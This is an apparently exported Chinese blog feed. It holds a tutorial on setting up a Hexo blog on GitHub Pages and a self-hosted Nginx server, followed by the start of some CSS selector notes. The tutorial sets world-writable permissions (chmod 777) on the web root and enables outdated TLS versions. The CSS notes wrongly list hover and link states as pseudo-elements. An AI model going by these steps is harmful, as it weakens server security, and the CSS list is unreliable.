<p>经过几天的研究，我终于搭起了一个Github博客网站。这篇文章将从以下几个步骤分别介绍博客的搭建。</p>
<blockquote>
<ol>
<li>前期准备</li>
<li>环境部署</li>
<li>配置域名（可选）</li>
<li>配置到个人服务器（可选）</li>
<li>附录</li>
</ol>
</blockquote>
<h2 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1. 前期准备"></a>1. 前期准备</h2><p>首先，你需要拥有以下内容：</p>
<blockquote>
<p>Github账号<br>个人域名（可选）<br>个人服务器（可选）</p>
</blockquote>
<p>Github账号可以到<a href="https://github.com/">Github</a>官网申请，过程很简单，这里就不赘述了。<br>个人域名可以选择<a href="https://www.aliyun.com/">阿里云</a>，<a href="https://cloud.tencent.com/">腾讯云</a>等域名产品，申请过程也就不说了，这个不是必选，有需要的可以搞一个。</p>
<h2 id="2-环境部署"><a href="#2-环境部署" class="headerlink" title="2. 环境部署"></a>2. 环境部署</h2><p>这一步就正式开始搭建自己的博客了。首先是安装一些软件：</p>
<blockquote>
<p>Git<br>NodeJS</p>
</blockquote>
<h3 id="Git的安装过程"><a href="#Git的安装过程" class="headerlink" title="Git的安装过程"></a>Git的安装过程</h3><p>首先到<a href="https://www.git-scm.com/download/">Git下载</a>页面下载Git，这里建议下载64-bit Git for Windows Setup版本，涉及到一些环境变量的配置，安装版可以自动配置环境变量，省去手动配置的烦恼（32位系统则选择32-bit版）。</p>
<h3 id="NodeJS的安装过程"><a href="#NodeJS的安装过程" class="headerlink" title="NodeJS的安装过程"></a>NodeJS的安装过程</h3><p>到<a href="http://nodejs.cn/download/">NodeJS下载</a>页面下载NodeJS，可以选择Windows 安装包 (.msi) x64版，原因同上。</p>
<h3 id="安装博客框架"><a href="#安装博客框架" class="headerlink" title="安装博客框架"></a>安装博客框架</h3><p>可以选择Hexo，Jekyll等博客框架。这里以<a href="https://hexo.io/zh-cn/">Hexo</a>为例(参考文档，博客主题在这个官网中可以查看）。<br>打开终端，执行如下命令安装（这一步需要管理员模式）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure>
<p>在本地新建一个目录，执行<code>init</code>命令初始化Hexo和Git：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo init</span><br><span class="line">git init</span><br></pre></td></tr></table></figure>
<h3 id="配置Github"><a href="#配置Github" class="headerlink" title="配置Github"></a>配置Github</h3><p>创建一个Repository，名字必须为<strong>your_user_name</strong>.github.io。（加粗部分替换为自己的用户名）<br>下面配置SSH Key方便后续上传博客代码。<br>在本地Git Bash中输入如下命令建立SSH Key：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮箱地址&quot;</span> -f ~/.ssh/github_blog_keys</span><br></pre></td></tr></table></figure>

<p>中间会提示你输入文件，密码，可以不用管，直接回车即可。配置成功后，打开生成的ssh-key，新生成的公钥就是<code>~/.ssh/github_blog_keys.pub</code>。到在自己的<strong>账户设置</strong>中，找到 <strong>SSH and GPG keys</strong> ，点击<strong>New SSH Key</strong> 添加新的Key。将刚刚生成的公钥文件中的内容复制这里即可。</p>
<p>之后我们需要配置自己的Username和Email：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;your_user_name&quot;</span> </span><br><span class="line">git config --global user.email <span class="string">&quot;your_email&quot;</span></span><br></pre></td></tr></table></figure>

<p>之后将本地仓库再关联到远程仓库，首先复制远程仓库地址，到Git Bash中执行下述命令，这一步要保证当前打开的路径是Hexo的路径：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git remote add origin https://github.com/your_user_name/your_user_name.github.io.git </span><br></pre></td></tr></table></figure>

<h3 id="配置Hexo"><a href="#配置Hexo" class="headerlink" title="配置Hexo"></a>配置Hexo</h3><p>在Hexo目录下执行下面这句，安装该扩展程序。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<p>打开Hexo下的<code>_config.yml</code>文件，在文件末尾添加：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">git@github.com:your_user_name/your_user_name.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<p>并修改<code>title</code>，<code>url</code>，<code>theme</code>等配置。</p>
<h3 id="开始编写"><a href="#开始编写" class="headerlink" title="开始编写"></a>开始编写</h3><p>下面就可以开始编写自己的博客了。<br>执行下面命令新建Hexo页面。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;HelloWorld&quot;</span></span><br></pre></td></tr></table></figure>

<p>之后会在项目的<code>/source/_post/</code>下看到<code>HelloWorld.md</code>文件，使用MarkDown语言编辑这个文件即可。编辑完毕保存退出，执行下述命令开始编译项目并上传：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>

<p>打开连接<code>https://your_user_name.github.io</code> 就能看到你的博客了。<br>也可以在本地看看效果：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>打开连接<code>http://localhost:4000</code> 即可看到效果。</p>
<h2 id="3-配置域名（可选）"><a href="#3-配置域名（可选）" class="headerlink" title="3. 配置域名（可选）"></a>3. 配置域名（可选）</h2><p>首先得需要一个域名（还得是备案过的）。这里以腾讯云的域名为例。在云解析服务中，选择你的域名点击右侧的<strong>解析</strong>，进入域名的配置页面。点击上方的<strong>添加记录</strong>，<strong>主机类型</strong>可以选<code>www</code>或者<code>@</code>，<strong>记录类型</strong>选择<code>CNAME</code>，<strong>记录值</strong>为your_user_name.github.io. （注意末尾有个点），之后<strong>保存</strong>即可。<br>在你的项目中的<code>/source/</code>目录下创建<code>CNAME</code>文件，文件内容是你的一级域名，如下所示：</p>
<blockquote>
<p>your_user_name.cn</p>
</blockquote>
<p>保存编译上传项目，过几分钟后即可配置成功。<br>如果要开启HTTPS，则还需要购买SSH证书（有免费的证书），例如可以选择阿里云，腾讯云或CloudFlare的免费HTTPS服务。这里以腾讯云为例，选择为期一年的免费版SSH证书。<br>在云产品中找到<strong>SSH 证书管理</strong>，点击<strong>申请免费证书</strong>，选择左侧的免费一年的证书。按照上面的要求输入相关信息，点击<strong>下一步</strong>，等待几分钟审核通过（也可能好久）。<br>回到<code>https://github.com/your_user_name/your_user_name.github.io</code> 中，进入<strong>仓库设置</strong>页面，下拉找到<strong>GitHub Pages</strong>，在<strong>Custom domain</strong>中输入自己的域名，并开启<strong>Enforce HTTPS</strong>。</p>
<h2 id="4-配置到个人服务器（可选，Ubuntu版）"><a href="#4-配置到个人服务器（可选，Ubuntu版）" class="headerlink" title="4. 配置到个人服务器（可选，Ubuntu版）"></a>4. 配置到个人服务器（可选，Ubuntu版）</h2><p>当然，首先需要一台个人服务器。配置过程主要分为几个步骤：</p>
<blockquote>
<p>安装Git-core<br>安装Nginx<br>配置Https</p>
</blockquote>
<p>首先安装Git-core和Nginx。登入服务器执行如下代码</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git-core nginx openssh-server</span><br></pre></td></tr></table></figure>
<p>安装成功后，开始配置Nginx。在这里我们可以使用SSL给网站加点安全措施。首先从腾讯云上下载SSL证书（笔者用Chrome下载证书时浏览器会崩溃，于是换了一个浏览器才下载下来），压缩包下会有Nginx版对应的证书。复制里面的证书到服务器上，这里可以使用xftp或MobaXterm的sftp上传，放到 <code>/etc/nginx/cert</code> 目录下。<br>在 <code>/etc/nginx</code> 下执行下述代码:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> sites-available/default sites-available/default-ssl</span><br><span class="line">sudo <span class="built_in">ln</span> -s sites-available/default-ssl sites-enabled/ssl</span><br><span class="line">sudo <span class="built_in">rm</span> sites-enabled/default</span><br><span class="line">sudo vim sites-enabled/ssl</span><br></pre></td></tr></table></figure>
<p>开始使用vim编辑刚刚得到的ssl文件，配置ssl访问，并设置80端口重定向到443端口。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  <span class="comment"># SSL configuration</span></span><br><span class="line">  listen 443 ssl default_server;</span><br><span class="line">  listen [::]:443 ssl default_server;</span><br><span class="line"></span><br><span class="line">  root /home/git/tmp/blog;</span><br><span class="line">  <span class="comment"># Add index.php to the list if you are using PHP</span></span><br><span class="line">  index index.html index.htm index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">  server_name www.your_domain.com;</span><br><span class="line">  ssl on;</span><br><span class="line">  ssl_certificate /etc/nginx/cert/your_crt_file.crt;</span><br><span class="line">  ssl_certificate_key /etc/nginx/cert/your_key_file.key;</span><br><span class="line">  ssl_session_timeout 5m;</span><br><span class="line">  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">  ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;</span><br><span class="line">  ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ =404;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line">  listen [::]:80;</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    rewrite ^(.*)$ https://$host<span class="variable">$1</span> permanent;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置完成后，记得在腾讯云的域名解析上添加一条A记录，来指向自己的服务器IP地址。完成后别忘了访问一下自己的网站，看看是否能够访问成功。<br>下面开始部署网站到自己的服务器上了。在自己的服务器上，首先搭建一个Git的服务器。首先将之前的<code>github_blog_keys.pub</code>中的公钥上传到服务器上，保存到 <code>~/.ssh/authorized_keys</code> 文件中。在自己的服务器中创建git账号。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo useradd git</span><br><span class="line">sudo passwd git</span><br></pre></td></tr></table></figure>
<p>输入git账号的密码，之后登陆到git账号中，创建仓库。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git --bare init blog.git</span><br><span class="line"><span class="comment"># 这两步后面有用</span></span><br><span class="line"><span class="built_in">mkdir</span> tmp</span><br><span class="line"><span class="built_in">mkdir</span> tmp/blog</span><br></pre></td></tr></table></figure>
<p>这里回到本地，先测试一下能否正常访问自己的git。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@your_server_ip:~/blog.git</span><br></pre></td></tr></table></figure>
<p>成功后利用hexo将博客代码部署到自己的服务器上。首先先配置自己的_config.yml文件。打开<code>_config.yml</code>文件，修改<code>deploy</code>部分的代码：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line"> <span class="bullet">-</span>  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repository:</span> <span class="string">git@github.com:your_user_name/your_user_name.github.io.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">master</span></span><br><span class="line"> <span class="bullet">-</span>  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repository:</span> <span class="string">git@your_server_ip:~/blog</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<p>保存后使用hexo提交博客代码。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>
<p>这样就可以提交代码到服务器上保存了。但是目前网站依然是无法访问的，需要再编写一个自动部署网站的脚本。<br>进入服务器，进入到目录 <code>/home/git/blog.git/hooks</code> 下，创建提交后执行的脚本。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash -l</span></span><br><span class="line">GIT_REPO=/home/git/blog.git</span><br><span class="line">TMP_GIT_CLONE=/home/git/tmp/blog</span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$&#123;TMP_GIT_CLONE&#125;</span></span><br><span class="line">git <span class="built_in">clone</span> <span class="variable">$GIT_REPO</span> <span class="variable">$TMP_GIT_CLONE</span></span><br></pre></td></tr></table></figure>
<p>创建完成后，修改一下权限，并重启Nginx。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x post-receive</span><br><span class="line"><span class="built_in">chmod</span> 777 -R /home/git/tmp/blog</span><br><span class="line">service nginx restart</span><br></pre></td></tr></table></figure>
<p>这次在客户端用hexo重新部署一次代码。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>到此结束，可以收工了。</p>
<h2 id="附录A-Hexo"><a href="#附录A-Hexo" class="headerlink" title="附录A Hexo"></a>附录A Hexo</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>Hexo初始化</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo init </span><br></pre></td></tr></table></figure>

<p>编译到静态页面</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo generate </span><br><span class="line"><span class="comment"># 简写 hexo g </span></span><br></pre></td></tr></table></figure>

<p>部署到Github上</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo deploy </span><br><span class="line"><span class="comment"># 简写 hexo d  </span></span><br></pre></td></tr></table></figure>

<p>使用本地浏览器查看 ( <a href="http://localhost:4000/">http://localhost:4000</a> )</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo server </span><br><span class="line"><span class="comment"># 简写 hexo s  </span></span><br></pre></td></tr></table></figure>


<p>创建新的Page</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo new  </span><br></pre></td></tr></table></figure>

<h3 id="配置主题-config-yml"><a href="#配置主题-config-yml" class="headerlink" title="配置主题 _config.yml"></a>配置主题 _config.yml</h3><p>首先给Hexo配置一个<a href="https://hexo.io/themes/">主题</a>，之后就可以在Hexo的主题的目录下看到_config.yml文件。<br>以<a href="https://github.com/theme-next/hexo-theme-next">NexT主题</a>为例，目录下的_config.yml文件中有如下选项：</p>
<ul>
<li>Site Information Settings  站点信息设置</li>
<li>SEO Settings  SEO设置</li>
<li>Menu Settings  菜单设置，包括显示的栏目，栏目图标等</li>
<li>Scheme Settings  主题风格设置</li>
<li>Sidebar Settings  菜单栏设置，包括友情链接，个人头像，侧边栏位置等</li>
<li>Post Settings  主页文章显示设置</li>
<li>Misc Theme Settings  主题其他设置，字体，代码风格等</li>
<li>Third Party Services Settings  第三方服务，数学插件，评论插件，统计插件，搜索插件等</li>
<li>Tags Settings  标签设置</li>
<li>Animation Settings  动画设置</li>
</ul>
<h3 id="创建分类与标签"><a href="#创建分类与标签" class="headerlink" title="创建分类与标签"></a>创建分类与标签</h3><p>使用如下两个命令分别创建分类与标签：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建分类</span></span><br><span class="line">hexo new page categories</span><br><span class="line"><span class="comment"># 创建标签</span></span><br><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure>
<p>创建完成后，需要在主题配置中开启相应的选项（例如NexT主题中的menu）。</p>
<h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><h5 id="图片本地化插件"><a href="#图片本地化插件" class="headerlink" title="图片本地化插件"></a>图片本地化插件</h5><p>在Hexo目录下执行下面语句：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>
<p>之后配置根目录下的_config.yml中：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">post_asset_folder:true</span></span><br></pre></td></tr></table></figure>
<p>之后再创建文章的时候，就会同时在同一目录下创建一个与文章同名的文件夹，里面可以存放文章中使用到的图片。在文章中引用文件夹下的图片pic.jpg方法如下：</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">![<span class="string">image</span>](<span class="link">pic.jpg</span>)</span><br></pre></td></tr></table></figure>

<h5 id="评论插件"><a href="#评论插件" class="headerlink" title="评论插件"></a>评论插件</h5><p>这里推荐两款评论插件，<a href="https://www.livere.com/">来必得</a>与<a href="https://leancloud.cn/">LeanCloud</a>。<br>来必得支持多账号登录，但是评论数据无法导出，而LeanCloud是匿名评论，提供的对象存储支持每日30,000次请求，总共10GB存储。</p>
<h5 id="搜索插件"><a href="#搜索插件" class="headerlink" title="搜索插件"></a>搜索插件</h5><p>这里使用Local Search，直接安装即可实现本地搜索。安装代码如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>

<p>回到博客的<code>_config.yml</code>中添加如下设置：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure>

<p>在主题的<code>_config.yml</code>中找到<code>local_search</code>，并启用该功能：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Local search</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h5 id="动态壁纸"><a href="#动态壁纸" class="headerlink" title="动态壁纸"></a>动态壁纸</h5><p>线条背景：在主题文件夹下找到<code>layout/_layout.swig</code>文件，在<code>&lt;/body&gt;</code>上方添加代码</p>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> theme<span class="selector-class">.canvas_nest</span> %&#125;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> <span class="attribute">src</span>=<span class="string">&quot;//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Live2D插件"><a href="#Live2D插件" class="headerlink" title="Live2D插件"></a>Live2D插件</h5><p>首先安装Live2D插件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure>

<p>这里推荐到<a href="https://github.com/xiazeyu/live2d-widget-models">xiazeyu</a>这里找一个喜欢的模型安装一下，我随便选一个为例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install --save live2d-widget-model-hibiki</span><br></pre></td></tr></table></figure>

<p>回到博客的<code>_config.yml</code>文件中，在最后添加代码，具体可以看<a href="https://github.com/EYHN/hexo-helper-live2d">EYHN</a>里面的介绍：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Live2D</span></span><br><span class="line"><span class="comment">## https://github.com/EYHN/hexo-helper-live2d</span></span><br><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># enable: false</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span> <span class="comment"># 默认</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span> <span class="comment"># 插件在站点上的根目录(相对路径)</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span> <span class="comment"># 脚本文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span> <span class="comment"># 模型文件相对与插件根目录路径</span></span><br><span class="line">  <span class="comment"># scriptFrom: jsdelivr # jsdelivr CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: unpkg # unpkg CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js # 你的自定义 url</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span> <span class="comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span></span><br><span class="line">  <span class="attr">debug:</span> <span class="literal">false</span> <span class="comment"># 调试, 是否在控制台输出日志</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-hibiki</span> <span class="comment"># npm-module package name</span></span><br><span class="line">    <span class="comment"># use: wanko # 博客根目录/live2d_models/ 下的目录名</span></span><br><span class="line">    <span class="comment"># use: ./wives/wanko # 相对于博客根目录的路径</span></span><br><span class="line">    <span class="comment"># use: https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # 你的自定义 url</span></span><br></pre></td></tr></table></figure>

<h5 id="pdf-插件"><a href="#pdf-插件" class="headerlink" title="pdf 插件"></a>pdf 插件</h5><p>安装PDF插件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-pdf</span><br></pre></td></tr></table></figure>

<p>在主题配置文件<code>next/_config.yml</code>中找到PDF配置，打开开关。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pdf:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Default height</span></span><br><span class="line">  <span class="attr">height:</span> <span class="string">500px</span></span><br><span class="line">  <span class="attr">pdfobject:</span></span><br><span class="line">    <span class="comment"># Use 2.1.1 as default, jsdelivr as default CDN, works everywhere even in China</span></span><br><span class="line">    <span class="attr">cdn:</span> <span class="string">//cdn.jsdelivr.net/npm/pdfobject@2.1.1/pdfobject.min.js</span></span><br><span class="line">    <span class="comment"># CDNJS, provided by cloudflare, maybe the best CDN, but not works in China</span></span><br><span class="line">    <span class="comment">#cdn: //cdnjs.cloudflare.com/ajax/libs/pdfobject/2.1.1/pdfobject.min.js</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS</title>
    <url>/2020/01/14/%E5%89%8D%E7%AB%AF/CSS/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h1><p>id选择器：#div-1</p>
<p>class选择器：.div</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span></span><br><span class="line"><span class="selector-pseudo">::before</span></span><br><span class="line"><span class="selector-class">.link</span></span><br><span class="line"><span class="selector-attr">[type=radio]</span>  <span class="comment">// 属性选择器</span></span><br><span class="line"><span class="selector-pseudo">:hover</span></span><br><span class="line"><span class="selector-id">#id</span></span><br><span class="line"><span class="selector-attr">[type=checkbox]</span>+<span class="selector-tag">label</span>  <span class="comment">// 组合选择器</span></span><br><span class="line"><span class="selector-pseudo">:not</span>(.link)  <span class="comment">// 否定选择器</span></span><br><span class="line">*&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>权重</p>
<ul>
<li>!important </li>
<li>内联样式</li>
<li>相同权重下后写的生效</li>
</ul>
<h1 id="组合选择"><a href="#组合选择" class="headerlink" title="组合选择"></a>组合选择</h1><p>后代选择器(以空格分隔)<br>子元素选择器(以大于号分隔）<br>相邻兄弟选择器（以加号分隔）<br>普通兄弟选择器（以破折号分隔）</p>
<h1 id="分组与嵌套"><a href="#分组与嵌套" class="headerlink" title="分组与嵌套"></a>分组与嵌套</h1><p>分组</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h1</span>,<span class="selector-tag">h2</span>,<span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">color</span>:green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>p{ }: 为所有 p 元素指定一个样式。<br>.marked{ }: 为所有 class&#x3D;”marked” 的元素指定一个样式。<br>.marked p{ }: 为所有 class&#x3D;”marked” 元素内的 p 元素指定一个样式。<br>p.marked{ }: 为所有 class&#x3D;”marked” 的 p 元素指定一个样式。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">color</span>:blue;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.marked</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">background-color</span>:red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.marked</span> <span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">color</span>:white;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.marked</span>&#123;</span><br><span class="line">    <span class="attribute">text-decoration</span>:underline;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="伪类"><a href="#伪类" class="headerlink" title="伪类"></a>伪类</h1><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">selector:pseudo-class &#123;property:value;&#125;</span><br></pre></td></tr></table></figure>

<p>:checked：input:checked：选择所有选中的表单元素</p>
<p>:disabled：input:disabled：选择所有禁用的表单元素</p>
<p>:empty：p:empty：选择所有没有子元素的p元素</p>
<p>:enabled：input:enabled：选择所有启用的表单元素</p>
<p>:first-of-type：p:first-of-type：选择的每个 p 元素是其父元素的第一个 p 元素</p>
<p>:in-range：input:in-range：选择元素指定范围内的值</p>
<p>:invalid：input:invalid：选择所有无效的元素</p>
<p>:last-child：p:last-child：选择所有p元素的最后一个子元素</p>
<p>:last-of-type：p:last-of-type：选择每个p元素是其母元素的最后一个p元素</p>
<p>:not(selector)：:not(p)：选择所有p以外的元素</p>
<p>:nth-child(n)：p:nth-child(2)：选择所有 p 元素的父元素的第二个子元素</p>
<p>:nth-last-child(n)：p:nth-last-child(2)：选择所有p元素倒数的第二个子元素</p>
<p>:nth-last-of-type(n)：p:nth-last-of-type(2)：选择所有p元素倒数的第二个为p的子元素</p>
<p>:nth-of-type(n)：p:nth-of-type(2)：选择所有p元素第二个为p的子元素</p>
<p>:only-of-type：p:only-of-type：选择所有仅有一个子元素为p的元素</p>
<p>:only-child：p:only-child：选择所有仅有一个子元素的p元素</p>
<p>:optional：input:optional：选择没有”required”的元素属性</p>
<p>:out-of-range：input:out-of-range：选择指定范围以外的值的元素属性</p>
<p>:read-only：input:read-only：选择只读属性的元素属性</p>
<p>:read-write：input:read-write：选择没有只读属性的元素属性</p>
<p>:required：input:required：选择有”required”属性指定的元素属性</p>
<p>:root：root：选择文档的根元素</p>
<p>:target：#news:target：选择当前活动#news元素(点击URL包含锚的名字)</p>
<p>:valid：input:valid：选择所有有效值的属性</p>
<p>:link：a:link：选择所有未访问链接</p>
<p>:visited：a:visited：选择所有访问过的链接</p>
<p>:active：a:active：选择正在活动链接</p>
<p>:hover：a:hover：把鼠标放在链接上的状态</p>
<p>:focus：input:focus：选择元素输入后具有焦点</p>
<p>:first-letter：p:first-letter：选择每个<p> 元素的第一个字母</p>
<p>:first-line：p:first-line：选择每个<p> 元素的第一行</p>
<p>:first-child：p:first-child：选择器匹配属于任意元素的第一个子元素的 <p> 元素</p>
<p>:before：p:before：在每个<p>元素之前插入内容</p>
<p>:after：p:after：在每个<p>元素之后插入内容</p>
<p>:lang(language)：p:lang(it)：为<p>元素的lang属性选择一个开始值</p>
<h1 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h1><p>::link：a::link：选择所有未访问链接</p>
<p>::visited：a::visited：选择所有访问过的链接</p>
<p>::active：a::active：选择正在活动链接</p>
<p>::hover：a::hover：把鼠标放在链接上的状态</p>
<p>::focus：input::focus：选择元素输入后具有焦点</p>
<p>::first-letter：p::first-letter：选择每个<code>&lt;p&gt;</code> 元素的第一个字母</p>
<p>::first-line：p::first-line：选择每个<code>&lt;p&gt; </code>元素的第一行</p>
<p>::first-child：p::first-child：选择器匹配属于任意元素的第一个子元素的 <code>&lt;p&gt;</code> 元素</p>
<p>::before：p::before：在每个<code>&lt;p&gt;</code>元素之前插入内容</p>
<p>::after：p::after：在每个<code>&lt;p&gt;</code>元素之后插入内容</p>
<p>::lang(language)：p::lang(it)：为<code>&lt;p&gt;</code>元素的lang属性选择一个开始值</p>
<h1 id="CSS-heck"><a href="#CSS-heck" class="headerlink" title="CSS heck"></a>CSS heck</h1><p>用于兼容 IE</p>
<h1 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>background：简写属性，作用是将背景属性设置在一个声明中。</p>
<ul>
<li>渐变<ul>
<li>linear-gradient(left, red, green)</li>
<li>linear-gradient(to right, red, green)</li>
<li>linear-gradient(180deg, red, green)</li>
</ul>
</li>
<li>多背景叠加<ul>
